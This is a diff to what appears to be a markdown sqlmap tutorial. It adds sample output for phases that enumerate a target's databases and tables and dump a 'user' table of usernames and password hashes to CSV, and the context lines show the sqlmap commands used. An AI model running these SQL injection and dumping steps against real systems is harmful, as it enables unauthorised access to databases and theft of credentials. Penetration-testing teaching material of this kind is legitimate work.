@@ -86,7 +86,10 @@ sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 --dbs
 
 **Output Example**
 ```
-x
+fetching database names
+available databases [2]:
+[*] information_schema
+[*] customer_db
 ```
 
 ### **Phase 3: Table Discovery**
@@ -98,7 +101,15 @@ sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D custo
 
 **Output Example**
 ```
-x
+fetching tables for database: 'customer_db'
+Database: customer_db
+[4 tables]
++------------------------+
+| user                   |
+| customers              |
+| invoices               |
+| products               |
++------------------------+
 ```
 
 ### **Phase 4: Column Extraction**
@@ -118,6 +129,20 @@ sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D custo
 ```
 - `--dump`: Extracts all data from the table
 - `--dump-format=CSV`: Outputs results in CSV format
+
+**Output Example**
+```
+Database: customer_db
+Table: user
+[3 entries]
++---------+---------+-----------------------------------------------+-----------+
+| id_user | level   | password                                      | username  |
++---------+---------+-----------------------------------------------+-----------+
+| 20      | 1       | xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (password)    | admin |
+| 26      | 1       | xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (password)    | staff |
+| 27      | 1       | xxxxxxxx                                       | admin2|
++---------+---------+-----------------------------------------------+-----------+
+```
 
 ### **Step 2: Locating the Output**
 SQLmap saves CSV files in:
